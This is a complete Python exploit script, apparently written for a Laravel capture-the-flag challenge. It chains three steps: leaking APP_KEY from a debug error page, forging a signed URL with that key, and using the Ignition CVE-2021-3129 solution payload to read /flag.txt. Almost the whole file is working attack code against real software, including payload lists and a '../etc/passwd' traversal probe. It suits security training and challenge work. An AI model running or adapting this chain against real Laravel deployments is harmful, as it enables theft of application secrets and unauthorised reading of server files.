#!/usr/bin/env python3
"""
Exploit: Trust Issues v2 - CVE-2021-3129 + Signed URL Chain
Target: Laravel CTF Challenge

This exploit:
1. Triggers a TypeError via malformed node_id to leak APP_KEY
2. Forges a signed URL for /_ignition/execute-solution
3. Exploits CVE-2021-3129 to read /flag.txt

Usage: python3 exploit.py <target_url>
Example: python3 exploit.py http://localhost:5050
"""

import sys
import re
import hmac
import hashlib
import time
import requests
from urllib.parse import urljoin

class Exploit:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.app_key = None  # Raw key string including "base64:" prefix

    def banner(self):
        print("""
╔═══════════════════════════════════════════════════════════╗
║  Trust Issues v2: CVE-2021-3129 + Signed URL Chain        ║
║  Laravel CTF Exploit                                      ║
╚═══════════════════════════════════════════════════════════╝
        """)

    def log(self, level: str, msg: str):
        colors = {
            'info': '\033[94m[*]\033[0m',
            'success': '\033[92m[+]\033[0m',
            'error': '\033[91m[-]\033[0m',
            'warning': '\033[93m[!]\033[0m',
        }
        prefix = colors.get(level, '[?]')
        print(f"{prefix} {msg}")

    def check_target(self) -> bool:
        """Verify target is reachable"""
        self.log('info', f"Checking target: {self.target}")
        try:
            r = self.session.get(f"{self.target}/dashboard", timeout=10)
            if r.status_code == 200 and 'SHADOW-NET' in r.text:
                self.log('success', "Target is reachable and running the challenge")
                return True
            else:
                self.log('warning', f"Unexpected response (status: {r.status_code})")
                return True  # Continue anyway
        except requests.exceptions.RequestException as e:
            self.log('error', f"Cannot reach target: {e}")
            return False

    def check_ignition_protected(self) -> bool:
        """Check if /_ignition/execute-solution requires signature"""
        self.log('info', "Checking if Ignition endpoint is protected...")
        try:
            r = self.session.post(
                f"{self.target}/_ignition/execute-solution",
                json={"test": "test"},
                timeout=10
            )
            if r.status_code == 403 and 'signature' in r.text.lower():
                self.log('success', "Ignition endpoint requires signed URL (as expected)")
                return True
            else:
                self.log('warning', f"Unexpected response: {r.status_code}")
                return True
        except:
            return True

    def trigger_error(self) -> str:
        """
        Trigger TypeError by sending malformed node_id to the API.
        Request with Accept: text/html to get the debug error page.
        Returns the raw HTML of the debug error page.
        """
        self.log('info', "Triggering error via malformed node_id...")
        
        # Simple invalid payload to trigger hex2bin error
        payload = "kj"  # Non-hex string
        
        try:
            r = self.session.get(
                f"{self.target}/api/node/status",
                params={'node_id': payload},
                headers={'Accept': 'text/html'},  # Request HTML to get debug page
                timeout=10
            )
            
            if 'APP_KEY' in r.text:
                self.log('success', f"Debug page received with APP_KEY exposed!")
                return r.text
            elif 'ErrorException' in r.text or 'Exception' in r.text:
                self.log('success', "Error page received")
                return r.text
            else:
                self.log('warning', "Unexpected response, trying alternative payloads...")
                
        except requests.exceptions.RequestException as e:
            self.log('error', f"Request failed: {e}")
        
        # Try alternative payloads
        payloads = ["!!!INVALID!!!", "null", "../etc/passwd", "AAAA-BBBB"]
        for p in payloads:
            try:
                r = self.session.get(
                    f"{self.target}/api/node/status",
                    params={'node_id': p},
                    headers={'Accept': 'text/html'},
                    timeout=10
                )
                if 'APP_KEY' in r.text:
                    self.log('success', f"Debug page received with payload: {p}")
                    return r.text
            except:
                continue
        
        self.log('error', "Could not trigger debug error page")
        return ""

    def extract_app_key(self, html: str) -> bool:
        """
        Extract APP_KEY from Laravel debug error page.
        The key is shown in the Environment Variables section.
        """
        self.log('info', "Extracting APP_KEY from debug output...")
        
        # Pattern to match APP_KEY in the custom debug view table
        patterns = [
            r'APP_KEY</th>\s*<td[^>]*>(base64:[A-Za-z0-9+/=]+)</td>',
            r'APP_KEY["\']?\s*(?:=>|:)\s*["\']?(base64:[A-Za-z0-9+/=]+)["\']?',
            r'"APP_KEY"\s*:\s*"(base64:[^"]+)"',
            r'APP_KEY=\s*(base64:[^\s<"\'&]+)',
            r'>APP_KEY<[^>]*>[^>]*>(base64:[^<]+)<',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)
            if match:
                key = match.group(1).strip()
                self.app_key = key
                self.log('success', f"Found APP_KEY: {key}")
                return True
        
        # Debug: save HTML for manual inspection
        self.log('warning', "APP_KEY not found in response")
        self.log('info', "Saving debug output to debug_response.html")
        with open('debug_response.html', 'w') as f:
            f.write(html)
        
        return False

    def forge_signed_url(self, route: str = '/_ignition/execute-solution') -> str:
        """
        Forge a Laravel signed URL using the extracted APP_KEY.
        
        IMPORTANT: Laravel uses the RAW APP_KEY string (including "base64:" prefix)
        as the HMAC key, NOT the decoded bytes!
        
        signature = HMAC-SHA256(url_with_expires, APP_KEY_STRING)
        """
        self.log('info', f"Forging signed URL for {route}...")
        
        if not self.app_key:
            self.log('error', "No APP_KEY available")
            return ""
        
        # Build URL with expiration (5 minutes from now)
        expires = int(time.time()) + 300
        url_to_sign = f"{self.target}{route}?expires={expires}"
        
        self.log('info', f"URL to sign: {url_to_sign}")
        self.log('info', f"Expires: {time.ctime(expires)}")
        
        # Generate HMAC-SHA256 signature
        # CRITICAL: Use the RAW key string (with base64: prefix) as the key!
        signature = hmac.new(
            self.app_key.encode('utf-8'),  # Raw string as key
            url_to_sign.encode('utf-8'),
            hashlib.sha256
        ).hexdigest()
        
        self.log('success', f"Generated signature: {signature}")
        
        # Complete signed URL
        signed_url = f"{url_to_sign}&signature={signature}"
        
        return signed_url

    def exploit_cve_2021_3129(self, signed_url: str, file_to_read: str = '/flag.txt') -> str:
        """
        Exploit CVE-2021-3129 to read arbitrary files.
        Uses the MakeViewVariableOptionalSolution to read file contents.
        """
        self.log('info', f"Exploiting CVE-2021-3129 to read {file_to_read}...")
        
        # CVE-2021-3129 payload
        payload = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "x",
                "viewFile": file_to_read
            }
        }
        
        try:
            r = self.session.post(
                signed_url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            
            self.log('info', f"Response status: {r.status_code}")
            
            if r.status_code == 200:
                self.log('success', "CVE-2021-3129 exploited successfully!")
                return r.text
            elif r.status_code == 403:
                self.log('error', "403 Forbidden - Invalid signature")
                self.log('info', f"Response: {r.text[:200]}")
            else:
                self.log('warning', f"Status {r.status_code}: {r.text[:200]}")
                return r.text
                
        except requests.exceptions.RequestException as e:
            self.log('error', f"Request failed: {e}")
        
        return ""

    def extract_flag(self, response: str) -> str:
        """Extract the flag from the response"""
        # Try direct flag pattern
        flag_match = re.search(r'FLAG\{[^}]+\}', response)
        if flag_match:
            return flag_match.group(0)
        
        # The file content might be in the response
        if 'FLAG' in response:
            # Try to find it in various formats
            lines = response.split('\n')
            for line in lines:
                if 'FLAG{' in line:
                    match = re.search(r'FLAG\{[^}]+\}', line)
                    if match:
                        return match.group(0)
        
        return ""

    def run(self) -> bool:
        """
        Execute the full exploit chain.
        """
        self.banner()
        
        # Step 0: Check target
        if not self.check_target():
            return False
        
        print()
        
        # Step 0.5: Verify Ignition is protected
        self.check_ignition_protected()
        
        print()
        
        # Step 1: Trigger error
        debug_html = self.trigger_error()
        if not debug_html:
            self.log('error', "Failed to trigger debug error")
            return False
        
        print()
        
        # Step 2: Extract APP_KEY
        if not self.extract_app_key(debug_html):
            self.log('error', "Failed to extract APP_KEY")
            self.log('info', "Try manually inspecting debug_response.html")
            return False
        
        print()
        
        # Step 3: Forge signed URL for Ignition endpoint
        signed_url = self.forge_signed_url('/_ignition/execute-solution')
        if not signed_url:
            self.log('error', "Failed to forge signed URL")
            return False
        
        print()
        self.log('success', f"Forged URL: {signed_url}")
        print()
        
        # Step 4: Exploit CVE-2021-3129 to read /flag.txt
        response = self.exploit_cve_2021_3129(signed_url, '/flag.txt')
        if not response:
            self.log('error', "CVE-2021-3129 exploitation failed")
            return False
        
        print()
        
        # Step 5: Extract flag
        flag = self.extract_flag(response)
        if flag:
            print()
            print("=" * 60)
            self.log('success', f"FLAG CAPTURED: {flag}")
            print("=" * 60)
            return True
        else:
            self.log('warning', "Flag pattern not found, showing response:")
            print("-" * 40)
            print(response[:1000])
            print("-" * 40)
            self.log('info', "The flag might be in the response above")
            return False


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5050")
        sys.exit(1)
    
    target = sys.argv[1]
    exploit = Exploit(target)
    
    success = exploit.run()
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
